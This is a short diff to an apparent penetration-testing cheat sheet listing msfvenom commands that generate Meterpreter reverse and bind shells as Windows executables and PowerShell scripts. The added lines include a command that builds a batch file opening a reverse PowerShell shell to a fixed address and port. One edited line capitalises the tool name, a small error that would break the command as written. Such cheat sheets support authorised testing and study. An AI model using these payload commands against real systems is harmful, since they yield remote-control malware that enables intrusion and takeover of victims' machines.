@@ -159,5 +159,8 @@ msfvenom -p windows/x64/meterpreter_reverse_https -f psh -o msf.ps1 lhost=<HOST>
 msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=<HOST> LPORT=<PORT> -f exe -o bind_tcp.exe
 
 # Meterpreter reverse tcp executable
- msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<HOST> LPORT=<PORT> -f exe > shell.exe
+Msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<HOST> LPORT=<PORT> -f exe > shell.exe
+
+# Bat file to run reverse powershell
+msfvenom -p cmd/windows/reverse_powershell LHOST=172.16.25.10 LPORT=8443 > attach.bat
 ```
